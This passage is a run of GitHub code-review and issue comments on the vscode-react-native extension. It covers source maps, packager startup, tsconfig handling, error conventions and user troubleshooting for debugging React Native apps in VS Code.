concurrently, it should work for running one app at a time I think, so it looks ok to me.\n. The source files refer to a sourcemap at the end of the file, and we do some tweaks to that (see https://github.com/Microsoft/vscode-react-native/blob/master/src/debugger/sourceMap.ts#L70 ) to make sure that it refers to the correct file. As long as the foo.js file refers to a bar.js.map file in a sourcemap comment, I believe that the debugger should correctly pick up the source map.\n. Can you rename this to AdbSimulation or something? When I was reading the code further up I was confused that there was this \"new Adb\" being given a FileSystem object, when the (non-test) Adb class expects different arguments. Took me a bit to realise that they were different things with the same name.\n. Instead of the magic number 101, you should use InternalErrorCode.CommandFailed\n. Does this $1 need to be quoted as well in the case of paths with spaces in them?\n. I'd suggest moving this atom script into a /scripts folder or something rather than just in the root of the package.\n. Does this just center the window on this line, or does it also move the cursor there?\n. This catch will only catch synchronous errors, since the .done() will throw asynchronously. You may want to add an error handler to the .done to report the error.\nThen again, this script is executed by the packager. What happens if the script does fail, does the packager report the error anywhere?\n. This should also account for dir === path.dirname(dir) to catch windows style directory roots\n. Sounds good.\n. I'm inclined to go with something more like\nconst fullpath = process.argv[2];\nconst filename = path.basename(fullpath);\nconst dirname = path.dirname(fullpath);\nconst fileInfo = filename.split(\":\");\nand reconstructing the full name by taking the dirname and the non-line-number part of the filename together again.\n. Is this lowercasing done to ensure that the path matches what vscode observes?\n. I see why you've done this, but I think I prefer changing things a little.\nWhat if we make getPathForRNParentWorkspace return null if it reaches the root of the filesystem without finding the workspace, and then this function checks for the non-emptiness of the result and gives the \"We couldn't find it\" error in that case? That way we distinguish between \"It wasn't there\" and \"Something terrible happened in isReactNativeProject\"?\n. This is perfectly legal, but we've been bitten by it a few times: We try to always reject with an Error not a string, so whenever we get to a catch block / error handler we know roughly what type of object we expect to receive. When we've been lax and rejected with strings, we've had bugs come in where we try to get a .message from a string, or something similar and get the wrong behaviour.\n. That is definitely a bug, good spotting. You should probably bump it up to differentiate them.\n. If we go the route of not having a special \"attach\" platform, I think I'd prefer to change the request type to \"attach\" and make the changes necessary for that rather than just omitting the platform which could surprise/confuse users.\n. Is there a reason you use RangeErrors rather than Error or a custom error type?\n. If another debugger is already connected, should we still attempt to reconnect? Or are you assuming that by rejecting the promise the process will terminate and so it doesn't matter?\n. Small typo: \"prewarm\"\n. Should this only happen if we started android? What should we do if the following happens:\n1. Via the command palette the user runs android, with the implicit logcat output\n2. The user debugs against iOS\n3. The user stops debugging\nShould we stop the logcat monitoring then? I feel like we shouldn't, but this is a niche scenario.\n. What is this remoteExtension used for?\n. Nevermind, I see. It's for the pipeline to communicate with the extension process if I am correct.\n. Will nodeDebugWrapper.nodeDebugSession.prototype.launchRequest be guaranteed to be the original launch request, or could it already be replaced by us? Perhaps we should grab references to launchRequest early on at global scope?\n. I'd suggest renaming nodeAdapterRequest to something more like originalLaunchFunction and add a comment saying that this is where we launch the process hosting the app JS.\n. Do you know if the node debug adapter returns a promise? Might be worth returning the value here anyway.\n. I don't think that these args include the launch.json parameters, the disconnect message is pretty minimal. We could stash the previous arguments when we get a launch/attach though, which should work fine most of the time.\n. I would suggest resolving with the matching group, if present:\nconst match = output.match(/react-native: ([\\d\\.]+)/);\ndeferred.resolve(match && match[1]);\nThat way you can set the return type to Q.Promise<string> and avoid the error you have in validateReactNativeVersion where right now (I believe) you are comparing the \"match\" object with the version string.\n. Console.log won't work here, you'd need to use a vscode API to pop up a message at the top of the screen.\nHowever I think a better approach is to avoid writing unless necessary. If I recall correctly, the reason that we originally wrote this tsconfig file was to get intellisense working across multiple JS files. If the user is making their own tsconfig file I think it is probably better to leave it untouched, so a more appropriate solution might be to only create the tsconfig if one doesn't exist, and otherwise don't bother doing anything to it.\n. We recently made a change so that isReactNativeProject is much more specific, and should only report false if we cannot run react-native commands. After you merge with latest master, could you check if this still reports errors too often for you?\n. Since we only use this to set two variables which only matter for non-typescript projects, I'm inclined to suggest the following: Replace this class with one that just has a createDefaultTsConfigIfRequired function which checks for the existence of a tsconfig.json file, and if one does not exist it creates it with \"allowjs\": true and also excluding node_modules. If something already exists, then do not touch it and assume that the user has configured it the way that they want.\n. I meant the whole thing though. With the code as you have it here, the intellisense helper class (which is the only caller of this TsConfigHelper class) will still always modify the tsconfig file, which can potentially trample the user's settings and runs into issues with comments. With the changes I propose, we would only ever create the file completely, never modify a pre-existing file, which means we don't need to worry about parsing it, and we don't trample user settings.\n. I was referring to this typings file. Since you've removed it as a dependency from our package.json, we should remove this typings file to avoid clutter.\n. We actually want to npmignore src not out: the npm package should contain the compiled code rather than the typescript sources\n. This can be folded into the next promise handler since it isn't async at all\n. I lie! It is actually an async getter!\nIn that case, I'd request making this a function call to avoid exactly this confusion.\n. Rather than always creating a new exp.json, is it worth allowing a user to customise their own? Should we only create this if it does not already exist? Might cause problems if someone upgrades their react-native version and we don't bump the exponent version though...\n. You use backticks here but don't interpolate anything. Are you missing something, or can we use normal quotes here?\n. Does this cache ever get invalidated? What happens if someone is working on their app with react-native V1, deploy to exponent, then they update to V2 and try to deploy again?\n. I had missed that check a few lines down from here. Looks good then!\n. I think that's probably fine, since I also agree that updating react-native isn't something you do a lot. It is worth making sure that it is documented somewhere though I think.\n. We might want to do something to make this pop out and be more visible, since I think right now it's potentially in a big stream of packager output and other messages.\n. The samples are intended for development, e.g. testing out features / running tests, rather than good examples of creating an app. Since it is intended for development only, and not useful for the end-user, we shouldn't be packaging it with the extension.\n. The default Error type does not have a code property, even though a lot of errors actually do, including the \"ENOENT\" error that I'm checking for here.\n. Somehow when running in vscode 1.4.0 when xdl isn't installed and so the require above throws an exception, it isn't stopping at this catch block, but also the rejected promise handler that ends up catching this error doesn't actually get an error to catch, it just gets undefined for some reason.\n. Note: We don't actually depend on this right now, but in the exponent integration we do, so I'm including this here rather than messing with licenses etc.\n. Done!\n. What's the reason for this change? The expression void 0 is just a way of producing a \"value\" of type void; the void consumes its argument and doesn't return anything.\n. You will also need to add the string for this error in https://github.com/Microsoft/vscode-react-native/blob/master/errorStrings/errorStrings.json\n. Some of this is outdated, I need to update this.\n. Should be removed, we don't have the sample app any more\n. This version should be bumped up, I believe 0.15 has some improved functionality, but it's up to 0.19 now so probably go with that if it works.\n. Need to remove these\n. I think that this is actually fixing the spacing issue; it is indented 3 steps, and has 12 spaces so I think it's correct now.\n. This is part of our debugging workflow, and could more accurately be called \"ensurePackagerIsRunning\". When debugging finishes we leave the packager running, and if the packager was running prior to debugging this call does not start a new one (Unless it is the wrong flavour of packager)\n. Each of these XDL.* functions return a promise, and we want them to execute in the correct order so we need to wait for each step to complete before beginning the next. \n. It doesn't actually matter; the way markdown works is that lines starting with a number end up making a numbered list, but the actual numbers don't matter in general. If you look at https://github.com/Microsoft/vscode-react-native/pull/301/files/31a9209070261d379a04239ef8d1d89e9e2b8907..cab9ea363d94083e7eed156034c6a3caf9e54503?short_path=04c6e90#diff-04c6e90faac2675aa89e2176d2eec7d8 you'll see how it renders\n. Did just notice a pacakger typo though.\n. Fixed, thanks.\n. We don't guarantee that the source file will be index.[ios|android].bundle, we let the native code define it and make whatever request it wants. I'd suggest just using *.bundle as the glob.\n. Does this change actually work? I didn't think you could point to a typescript file to run it.\n. Is this the correct path? shouldn't it be path.resolve(vscode.workspace.rootPath, \"typings\", \"react-native.d.ts\") or something similar?\n. If it works when placed inside a typings folder, then I'd prefer that so we don't clutter the project too much.\n. Actually, we shouldn't reference react-dom.d.ts since that doesn't apply to react-native\n. We might also want similar logic in /src/common/exponent/exponentPlatform.ts, unless that is already part of starting the packager.\nIn fact, perhaps we should always just call this.remoteExtension.startPackager() here, and move the \"Is one already running, and is it the right one? Maybe stop and restart\" logic into the extension process rather than here in the debugger.\n. These should be on two separate lines, not the same line right?. You can't refer to the vscode package from this file as-is: Sources under src/common can be referenced both from within the vscode extension process and within the external debug adapter process, and the debug adapter process cannot access vscode.. As above, we can't directly refer to vscode in here since it is also accessed from within the separate debug adapter process.. Is this the right condition? I believe that running react-native foo requires you to be in the folder with the node_modules/react-native folder inside it, so if your folder structure looks something like\nroot\nroot/project/package.json\nroot/project/node_modules/react-native\nroot/site/<other content>\nthen workspaceRoot will point to root, but the react-native project is located at root/project and that's where the package.json must be, and where we should start react-native from.. This won't be the default location where vscode stores workspace settings: If you have the workspace open in root and the project in root/project, then this path I think would be rooot/project/.vscode/settings.json, while opening up the local workspace settings would open up root/.vscode/settings.json. Unless I'm misinterpreting where you intend to place the entry point that we run?. I'm not sure that we want to put this file in with the user's sources rather than in the .vscode folder; it's not really part of the end-user's app, it's just an implementation detail of us converting to an exponent app.. This path needs to point to wherever the exponentIndex.js file is I believe, otherwise the exponent packager won't find the entry point (or the rest of the app). You're right, I forgot that we have to specify the path in launch.json. Looking at https://code.visualstudio.com/docs/editor/tasks#variable-substitution it seems that the variables which can be substituted are limited, but it does include environment variables, so we _could do something a bit hacky and have the extension set a VSCODE_REACT_NATIVE_PROJECT_ROOT environment variable and reference that, but I don't like that idea much.\nAlthough, looking at the vscode codebase I do see a test with https://github.com/Microsoft/vscode/blob/ea26b957f6c593410724cd341e1db2c7c37170b8/src/vs/workbench/services/configurationResolver/test/node/configurationResolverService.test.ts#L117 which might suggest that we could reference ${config['react-native-tools'].projectRoot} or something and it might work out?\nIf not, I think the current approach is ok. Should you also reference importScripts here?. I'm cautious about these requires here. I know that react-native redefines global require, so I'm not sure whether that can impact this if importScripts is called more than once. Might be worth using an IIFE to take a reference to the original require function initially and use that when importScripts is called? Or even just cache both fs and vm immediately and use those in importScripts. Shouldn't other messages be passed on to the other process to be run in there?. Oh, I see that is handled in the done coming up next.. Something else that I would recommend is adding a global __debug__ object with a require function which caches the node require. This matches what we currently expose in the original sandboxing method, and allows things such as realm to provide shims for native functionality when necessary.. This won't modify this.worker which I believe was your intent.. Looks like this comment is unfinished?. What's the reasoning behind increasing this limit here? Before we used 1 just to make sure that it was asynchronous. Is the delay of 100ms actually required for processing to happen on time, are there potential race conditions here?. Could you please update the return type to match what is expected?. ",
    "digeff": ":+1: \n. :+1: \n. :+1: \n. After the last two comments are applied: :+1: \n. The task for improving the logging level is: Task 188516\n. :+1: \n. @meenakb by test do you mean test\\SampleApplication or just test\\ ?\n. Changed to test subfolder\n. Added test/** to .vscodeignore\n. Run tslint and removed fs import\n. Is there any tslint rule or anything we can use to check that public methods are at the top automagically?\n. :+1: \n. :+1: \n. Do you have a repro?\n. Implemented some logic to try to stringify the error. I tested it by running run-ios in Windows and now we show this for that case: \n### Error while executing: react-native.cmd run-ios {\"error\":1}\n. @MSLaguana Nice work! :)\n. The relative path from the source map to the source itself was incorrect (we didn't configured sourcemaps-gulp properly)\n. Updated with @dlebu fix\n. Applied @dlebu 's feedback\n. Fixed tslint errors\n. Is it possible to use lsof or a similar tool to find out which files are opened when you get that error, and who opened them?\n. What's the exact error? Have you checked if this is a known react native issue by any chance?\n. The infrastructure looks well, we can add the telemetry events in other PRs as discussed.\n. The command executor for the packager doesn't actually ever finishes... The way we are killing it it's probably returning an error code, so CommandExecutor shows that error code. Is it possible to terminate the packager in a nicer way? So it'll exit with an 0 error code?\n. I haven't been able to reproduce this. Could you paste the full Debug Console log?\n. We shouldn't be broadcasting the intent, if launching the app failed\n. We should refactor the code that handles that for iOS into a common place like CommandExecutor or ReactNativeProjectHelper\n. Will be solved in: https://github.com/Microsoft/vscode-react-native/pull/94\n. :+1: \n. This issue is related to this: https://github.com/Microsoft/vscode-react-native/issues/69\n. Fixed in https://github.com/Microsoft/vscode-react-native/pull/79\n. This error can be easily reproduced by trying to debug this project: https://github.com/Khan/math-facts\n. This was solved in: https://github.com/Microsoft/vscode-react-native/pull/62\n. :+1: \n. Fixed in https://github.com/Microsoft/vscode-react-native/pull/79\n. :+1: \n. The sample application is still the easiest way to debug our code inside the Debugged Process, so I'd keep it from the time being.\n. :+1: with some comments\n. :+1: with two minor comments. Should we add telemetry to this code?\n. :+1: apart from a minor comment\n. @dlebu @joshuaskelton @meenakb @MSLaguana @MShamiltonia @guillaumejenkins Can you guys take a look, specially at the parts of the code you own, to make sure that the changes I did make sense? Thanks!\n. :+1: \n. We fixed this. Now the read-me looks like:\n\n. Great work! :+1: :+1: :+1: \n. :+1: \n. We have stuff with different conventions: ReactTypings, SampleApplication, js-patched, react-native and files in camel case.\nIf the whole team agrees with a convention we should follow, I'm happy to make the change.\n. I'll merge this PR. If the team decides to go with:\nkeep files in camel case\nchange folder names to lower case and use - as a separator\nI'll create a new PR with that change.\n. Looks good to me :+1:\n. Great change! :+1: \n. Other iOS tests I'd add are:\nIOSDebugModeManager.findPListFile // waits until the file appears, and then it returns it\nPlistBuddy.getBundleId // returns proper bundle for both a simulator build or an iphone build\nSimulatorPlist.findPlistFile // Works as expected if non file is found, and more than 1 is found\nXcodeproj.findXcodeprojFile // Works as expected if non file is found, and more than 1 is found\nCompiler.xcodeBuildArguments // Correct build arguments are generated\nAll DeviceRunner. It has a lot of quite complex logic.\nAll IOSPlatform.\nAlthough it's probably outside the scope of this PR, and we should create a new task to do it instead.\n. :+1: \n. I think that LCA generates that file. I can add a TODO in the third party dependencies file though. What do you think?\n. I think that makes sense, but not for this PR :)\n. I like your idea @MSLaguana . We should create a task for that.\n. Created task for doing that: https://github.com/Microsoft/vscode-react-native/issues/106\n. Glad you figured it out. Please reopen it if you still have more issues.\n. @panarasi The logcat output appears on it's own output channel (last time I checked at least)\n. @dlebu Why does the order matter?\n. That's easy to fix no matter the order of the PRs.\n. Branch got messed up somehow when I merged master, so I rebased to master and squashed into a single commit\n. Also, while this issue is happening, can you go to the browser and tell us what the content of: http://localhost:8081/status is ? (That will show us the status of the packager).\n. What React-Native library version are you using?\n. The Preview version doesn't support 0.21, only 0.19 and 0.20.\nWe already have the fix in master, and it'll be included in the next release. We are sorry for the inconvenience, and we'll update this issue as soon as we publish the new version.\n. @n8stowell82 Could you please tell us:\n1. At which commit are you on master?\n2. What version of VS Code are you using?\n3. By your comment it seems you are on React-Native 0.21 right?\n4. Could you please copy us the latest log messages that you see both on the Debug Console and the React-Native output channel when this issue happens?\n. :+1: \n. @patridge Thank you very much for your contribution. We also appreciate any feedback you may have of the React Native Tools on our issues section: https://github.com/Microsoft/vscode-react-native/issues\n. Hi @csholmq, thanks for reporting this issue. Can you give us some more details about your scenario? We are interested in the following:\n1. Which version of react-native is your project using?\n2. Have you tried uninstalling our extension and checking if this is still happening?\n3. Do you see any additional errors in any output channel or other windows?\n4. Does the functionality of the extension work after getting this error (Can you debug? Can you use the commands from the command palette)?\n. Thanks for the feedback! We've identified the issue you showed us on the second screenshot, and the fix will be included in the next release.\nAre you still able to reproduce the first issue consistently? What are the exact steps that you are doing?\n. @awclives Could you please send us a screenshot of the contents of the folders .vscode\\typings\\react and .vscode\\typings\\react-native of you workspace? So we can check if the extension copied the correct files to those locations.\n. @awclives Sorry about the misunderstanding. I meant the .vscode folder inside your react-native project next to the android, App, ios, and node_modules folders. Can you please show us that one?\n. :+1: \n. Nice refactoring :+1: :+1: :+1: \n. :+1: \n. Will this detect if the packager is run externally? I liked your idea of querying ever 1 sec or so, so we can detect both internal and external packagers...\n. :+1: \n. :+1: \n. :+1: Is there any kind of dictionary check we can put as part of the build or tslint?\n. :+1: \n. I think that running in iOS while you are debugging on Android is a 100% valid use case.\nIf we are going to do this, we should make sure that we don't prevent the users from doing anything useful they want to do.\n. @MSLaguana Maybe we should have the extension override the schema. A lot of users are going to run into this behavior, if we want to support React-Native inside VS Code we shouldn't show an error on that file if there isn't one. What do you think?\n. @vsccarl: Do you get any kind of errors when you open your React-Native project in VS Code?\nWhat happens if you try to use the commands from the React-Native palette like run-android or run-ios? Do they work? Do you get any kind of error?\n. @vsccarl Could you please go to Help --> Toggle Developer Tools --> Console and check if there are any messages there. If there are, could you please send us a screenshot or paste the text?\nThanks!\n. @vsccarl For the time being I'd advise you to use the latest stable version of VS Code where that error shouldn't be happening. I'll update this issue after we've push a fix for this to master.\n. @vsccarl  The fix is now available on our master branch. It will be included in our next release.\n. @chrisdias The fix is now available on our master branch. It will be included in our next release.\n. @hamiltonia @MSLaguana Do you guys agree with these recent changes?\n. @herdotage Sorry for the delay.\n1. Can you successfully run the react-native start and react-native run-android commands from the command line for that same project/computer?\n2. Are you getting any messages in the Developer Console (Help -> Toggle Developer Tools -> Select Console tab):?\n3. Which versions of VS Code and the extension are you using?\n. @herdotage What do you mean by the \"Node.js command prompt\"? Does react-native works in the Windows Command Prompt as in:\nStart Menu ==> Command Prompt then:\nC:\\Users\\herdotage> cd c:\\your_workspace\\your_project\nreact-native start\nIf that works, can you also try:\nreact-native.cmd start --port 8081\nThe ENOENT error code you are getting means that when we try to execute 'react-native.cmd start --port 8081' from inside the application, the spawn utility can't find the file react-native.cmd. The spawn utility uses the PATH environment variable to find the react-native.cmd file which in windows when you install react-native-cli globally is usually located at: %APPDATA%\\npm\\react-native.cmd\nSo running react-native.cmd start --port 8081 should be equivalent to run:\n%APPDATA%\\npm\\react-native.cmd start --port 8081\nThe fact that you are getting ENOENT makes me think that either react-native-cli didn't install properly, or that the npm folder with all the .cmd files used for the npm modules CLIs isn't in your PATH variable.\nYou can run echo %PATH% in the command line to see the contents of your path variable, and check if the npm folder with the react-native.cmd file is there.\n. @dlebu:\n1. It saves me time because I get the errors directly on the .ts files instead of the .js files\nIt's a few seconds each time it happens, and while developing tests it happened probably about 5 times per hour. I think it'll be a lot of time in the long run.\n2. This is for developing/debugging only. It shouldn't affect the product at all\n3. At the moment I've only tested this on the extension context and the tests. The first time we need it in the Debugger or Debugee process we can add it there too (You just need to include the file and call install).\n. @MSLaguana I'm assuming that now. If that ever changes, we'll update this launch configuration to exclude the tests using vscode somehow...\n. @dlebu I ran gulp package and the translation wasn't on out/extension/rn-extension.js\n. @dlebu @guillaumejenkins What do you think?\n. This is used in the tests I wrote for run-android.\nThe idea is to use these in all Android tests in the future.\n. This is also an issue when you install react-native globally instead of react-native-cli\n. :+1: with some minor comments.\nPlease make sure we get a reasonable error message if the user forgets to specify the platform.\n. There is also an issue with the packager, and we executing react-native.cmd run-android before the packager finishes loading, because the promises are returning sooner that they should.\n. @dlebu On second though, you are right... I'm going to test the run-ios.\n. @hamiltonia @dlebu @meenakb Redesigned the waitForStarted method to have a nice solution for this issue. Please, could you re-review the PR from scratch?\n. @Margie-Rose What issue are you having with the product?\n. @Margie-Rose Closing because we don't have any information. Please re-open if you have any issues to report.\n. We could also improve this by showing some kind of status in the status or a hourglass cursor or something.\n. :+1: With some minor comments\n. Yes\n. @XiSmartElf Have you been able to resolve the issue?\n. @Mokto Could you please answer these questions so we can try to diagnose your issue?\n1. Do you get any more messages after 3?\n2. Did you start the packager manually outside of VS Code, or inside VS Code?\n3. What are the last messages you got on the packager (View --> Toogle Output if you started it or it was started inside VS Code)?\n4. Are you running the packager on port 8081? What do you get when you go to localhost:8081/status?\n5. When that scenario happens, if you then go to http://localhost:8081/debugger-ui and open chrome, does it work debugging/settings breakpoints there?\nThanks!\n. Can you please try this:\n1. Get into that same situation where chrome says: \"Another debugger is already connected\"\n2. Stop the VS Code session by pressing the Square red Stop button\n3. Refresh the Chrome page again to see if it still says: \"Another debugger is already connected\"\nThe reason you are getting the messages 2. and 3. all the time it's because it's trying to connect to the packager, and failing, and retrying again... Given that you are getting the \"Another debugger is already connected\" message in Chrome I'm wondering if you have another Debugger instance connected to the packager already (Possible another Chrome or VS Code instance, or some hanged processed remaining of those two). When a debugger is already connected to the packager, new connections fail, so that could be an explanation for this behavior.\nCould you also try restarting your PC, starting VS Code, starting the packager from the command palette, starting the debugging session, when you get that error close all open Chrome windows, and see if you are still getting that error?\nThanks!\n. @Mokto Happy to help!\nWe appreciate all feedback, so please open all issues you run into, and we'll do our best to help!\n. @Mokto Thanks for the intention though.\nPRs are very, very, very, very welcomed! :) :+1: :+1: :+1: \n. @gilesbradshaw In which exact line are you trying to set the breakpoint?\n. Can you hit breakpoints in other parts of the program?\nWhat happens if you use a hard breakpoint as in:\ndebugger;\n. @gilesbradshaw Please do tell us if you find out how to generate the correct source maps!\n. @foobar8675 Thanks for the video, it made really easy to understand and reproduce your issue!\nIt seems that VS Code doesn't let you add a new debug configuration after the launch.json file already exists. Can you try renaming that file to something else, to see if that fixes your issue?\n. @gilesbradshaw I'm happy you were able to resolve your issue! Thank you for reporting this!\n. :+1: \n. It seems wrong that:\nerr.code != err.innerError.code\nwe should probably copy the innerError code to the outer error when we are creating them\n. @dlebu I don't know at the moment how to fix that properly without doing any hacks. When I have some time I'll learn how to properly fix the build gulp task, and fix it.\n. \nSo this fix still has issues, but at least it does fail when it should, and succeeds when it should.\n. @inturbidus Where are you putting the breakpoint (JavaScript code or react-native tags)?\nCan you trying setting a hard-breakpoint as in: \"debugger;\" in some javascript code and tell us if that breakpoint gets hit?\n. Can you try these two lines:\n```\nvar NavigationBarRouteMapper = {\n  LeftButton(route, navigator, index, navState) {\n  console.log(\"Line where the breakpoint should be hit\"); // These two lines\n  debugger; // These two lines\n    if(index > 0) {\n      return (\n         { if (index > 0) { navigator.pop() } }}>\n          Back\n)\n    } \n    else { return null }\n  }\n```\nAnd tell me if the console line is printed on the VS Code Debug Console? And if the debugger stops at: \"debugger;\"?\nI'm trying to figure out whether the issue is that VS Code is not properly connected to the debugger, or it's properly connected but the source mapping is not mapping the breakpoints you are setting correctly.\n. Also, could you please shake the device or simulator and tell me if the menu that appears says: \"Disable Chrome Debugging\" or \"Enable Chrome Debugging\"?\n. It might be a source mapping issue. Can you please edit the launch configuration you are currently using in the launch.json file and add < , trace: \"sm\" > after the < \"outDir\": \"${workspaceRoot}/.vscode/.react\" > property)? That option will print debugging information regarding source maps.\nThen can you remove all existing breakpoints (There is a menu for this if you right click on the Breakpoints panel in the Debug tab). Run your application, set a single breakpoint that's currently not being hit, and try to hit it.\nThen please send us all the messages printed by the \"trace\": \"sm\" option (they'll appear on a different color), so we can try to figure out what's happening?\n. You're welcome! Please do send us any feedback/suggestions/issues you find :)\n. \n. Thanks for fixing this! :+1: \n. Thank you for your contribution!\nsourceMaps: \"Whether to use JavaScript source maps to map the generated bundled code back to it's original sources\"\noutDir: \"The location of the generated JavaScript code (the bundle file). Normally this should be \\\"${workspaceRoot}/.vscode/.react\\\"\"\nlogCatArguments: \"Arguments to be used for LogCat (The LogCat output will appear on an Output Channel). It can be either such as an array: [\\\":S\\\", \\\"ReactNative:V\\\", \\\"ReactNativeJS:V\\\"] or a string such as \\\":S ReactNative:V ReactNativeJS:V\\\"\"\n. @MSLaguana I didn't know that.\nIn that case, the default behavior for logCatArguments is [\"*:S\", \"ReactNative:V\", \"ReactNativeJS:V\"];\n. @mroswald The string I sent you was in the wrong order, sorry :/\nPlease change \"It can be either such as an array:\" to \"It can be either an array such as :\"\nApart from that it looks good! :+1: \n. I think that the default value of outDir should be null actually, as in: https://github.com/Microsoft/vscode-node-debug/blob/master/package.json#L216\nEverything else looks perfect!\n. @mroswald I think that @MSLaguana Was asking why are you replacing the / for _ in the paths in src/debugger/scriptImporter.ts ?\nAdding support for --project-path completely makes sense!\n. In the cases we've seen so far, only the bundle file is downloaded. What's your scenario? Why do you need a directory structure there? Which scripts are being imported in your project?\n. We have some known issues with matching breakpoins: https://github.com/Microsoft/vscode-react-native/issues/74 https://github.com/Microsoft/vscode-react-native/issues/206\nAny chance you are running into those issues?\n. You can add the launch option:\n\"trace\": \"sm\"\nTo get some source maps debugging information printed on the Debug Console. That might help you figure out what's happening.\n. That means that the source map it's telling VS Code that the line index.ios.js:20:0  matches to: index.ios.bundle:37025:0\nIf that's not true, it's probably due to this bug: https://github.com/facebook/react-native/issues/6946 .\nIf that mapping is actually correct, then you may have found a bug in either the Node Debugger or VS Code itself.\n. Yes, that's the bug with the react-native source maps not mapping to the correct line numbers. We are hoping that react-native will fix this issue soon,\n. @mroswald Have you tested this both on iOS simulators and a real iOS device?\n. :+1: \n. @mroswald Thank you very much for your contribution!\nThe code that we download to .vscode/.react/ gets executed in the appWorker.ts file on line 116:\nvm.runInContext(contents, this.sandboxContext, filename);\nThe issues you may run into source mapping if you modify the file path, is that the bundle file has a reference to the .map.js file, and the .map.js file has references to the bundle and to the source files themselves. You need to make sure that all the paths are valid if you change anything. Maybe it'd be easier to just download foo/index.ios.bundle to .vscode/.react/foo/index.ios.bundle\nDoes the packager support debugging multiple apps at the same time? Does this work in Chrome?\n. @mroswald We are looking into creating a new release in a week or so\n. Thanks for the fix! :+1: \n. :+1: \n. Please add some tests\n. :+1: \n. :+1: \n. :+1: \n. :+1: \n. Now you need to prepend ${workspaceRoot} to the dirs according to a warning you get in the latest vs code\n. Do we want to write this in TypeScript and pre-compile it as we do in TACO?\n. Please convert everything to either tabs or spaces\n. What do we use rimraf for?\n. Can you add a // TODO: Change this to a [\"runAndroid\", ...].forEach\nfor whoever implements the commands?\n. I'm not sure what's the best option. It seems that the values of the package.json are in camelCase, which would mean we should use reactNative.\nDo the users see or use this value at any point? If they don't, then I'm happy with either of the 3 options.\n. Let's put \"React Native\" in the label\n. Could we use __dirname instead of (${JSON.stringify(vscode.workspace.rootPath)} to detect the current workspace (so to not make it hardcoded)?\n. Could we add a fwlink to some hypothetical future documentation/troubleshooting guide that explains how to solve this issue?\nSame for when the debugStub is not a file\n. I'd add a TODO so in the future we can enhance this to detect if the extensions folder is outdated, and update it if necessary.\n. If I understand this doc correctly: https://code.visualstudio.com/Docs/extensions/overview \nAll extensions when activated run in our shared extension host process. This separate process for extensions ensures that VS Code remains responsive through-out.\nIt seems that all the extensions run in the same process. We should probably avoid sync methods to play nice with other extensions...\n. upper case for System?\n. I think we should manage this version number manually (hardcode it to 1). We only want it to change when the file format actually changes, not with each release.\n. What if we use both?\n// File automatically generated. Extension Version: 1.0.0 Launcher Version: 1\nIf we do forget to update the manual version we can always use the extension version.\nIf we do remember to update the file version, our switch when we have to take an action based on the file version will be simpler....\n. I opened a workspace on a folder while I was running react-native init to create the project there (so initially the package.json existed but didn't had the react-native dependency), and the plugin didn't seem to kick in... I had to restart the workspace to get it to run...\n. I synced with Daniel, and this actually seems over-kill. Forget my last comment...\n. I think that using instance methods would give us more flexibility. What do you think?\n. TODO: We should make sure this behaves properly if the platform argument is missing\n. TODO: We should refactor this to use Promises.retryAsync and have a max timeout\n. I found to be a useful practice to always leave a new line after => so you can then put a breakpoint inside the anonymous function when needed. If you agree, I'd suggest that we do that for all code. Ever. Forever.\n. According to the spec it seems that this needs to be on it's own line, at the end of the file. Have you seen any cases where that doesn't happen?\nFrom https://docs.google.com/document/d/1U1RGAehQwRypUTovF1KRlpiOFze0b-_2gc6fAH0KY0k/edit#heading=h.lmz475t4mvbx\nThe generated code may include a line at the end of the source, with the following form:\n//# sourceMappingURL=\n. It's intended to be used everywhere that you execute a command and you want the user to see it's output...\n. TODO: The packager could take a while to bundle a big project. We should have a carefully picked timeout, and/or retry strategy...\n. We should make sure that this logic works for folders with spaces, or weird symbols in their names.\n. Why is this returning a promise if we use a Sync function to write the files?\n. Now that you have refactored this into a more generic class, I'd rename this from packagerCommandName to reactNativeCommandName\n. TODO: If we do care about linux, we might need to figure out what to put here...\n. If possible, I'd eliminate the duplicated code of lines 44, 45 vs 48 and 49.\n. Older versions of react-native use //@ sourceMappingURL=\ninstead of //# sourceMappingURL=\nTODO: If we decide we do care about those versions (and the debugger worker works, etc...) then we'll need to update this code.\n. The map file includes stuff like this:\n\"require-InitializeJavaScriptAppEngine.js\",\n\"require-RNAppWithIntegratedExtension/index.android.js.js\"\nWe should make sure we handle those properly\n. We assume they arrive in absolute paths to the local file system without the file:// prefix.\nWe need to convert them to relative urls.\n. We should check with Parashuram if we should be deleting these files, or what's the expected behavior for how we handle them...\n. This should be a debugging message...\n. We should update this to search for the sourceMappingURL at the end of the file, and to ignore some \"reasonable\" white-spaces if possible\n. I agree... We could also pass some kind of strategy parameter that handles the specific place where we print, or detect it automatically and use it inside here...\nI'm guessing that whoever implements the Commands Palette will take care of that...\n. TODO: Find some way to put emphasis on the error messages in contrast with the standard output...\n. Maybe we could rename this to something longer, so it'll match in length the ended command like:\nStarting execution: react-native run-android\n...\n...\nFinished executing: react-native run-android\n. I think we should have an option or a way for users to see the stack traces of the errors, so it'll be easier for us if they paste the whole error message in an issue.\n. Did you call url.format ( https://nodejs.org/api/url.html#url_url_format_urlobj ) to print it after the update?\n. I think I've seen the packager take more than 16 seconds to start on one of my machines and it certainly depends on the machine speed, so I think we should at least put 60 seconds there.\nOn the other hand, I've just realized that what I said about a big project isn't correct, because the bundle isn't being created at startup, so we don't need to prepare for that case in this part of the code.\n. I meant that this is a debugging message concerning how our extension works, so users wouldn't care about this (unless our extension is not working correctly).\n. We still want to have a lot of granularity so the user doesn't wait unnecessarily, so I think we should retry at least 1 per second.\nMaking an HTTP is quite light too, so I don't see any harm in making 60 in a minute...\nAnother alternative would be to do an exponential backoff, but I don't think that's needed in this case\n. We can do a request once a second, but only print status once every 5 seconds.\nAdditionally, the packager will be outputting messages to the Debug Console, so that should be enough for the user to know that we are progressing...\n. Should we:\n=============== Starting Packager =============\nrunning: react-native start --nonPersistant\n...\nor\n=============== Running react-native start --nonPersistant =============\n...\nFor the first one we'd need the subject. What do you guys think is better?\n. :+1: \n. According to the vs code node team, we should be able to put any folder here (even outside the workspace), and this should still work. Is this the best location for this file? Or would a temporary location be better? What do you guys think?\n. execute is for commands with very small output (And it gives the result at the end)\nspawn is for commands with long output, and it's given in real time. I think we should use spawn here...\n. TODO: I'm not sure if people normally modify the name of their react-native apps in the native code directly, If they do, we might need to update this functionality to read the app name from the androidManifest.xml instead of the package.json\n. The previous block is sync... We should merge both parts into a single block.\n. I'd replace that any with the proper type if possible\n. I'd move the null/empty check inside the dependencies() method \n. ; typo at the end\n. @MSLaguana react-native run-android will run on a device if it's the only thing currently \"attached\" to the computer. I think that for V1 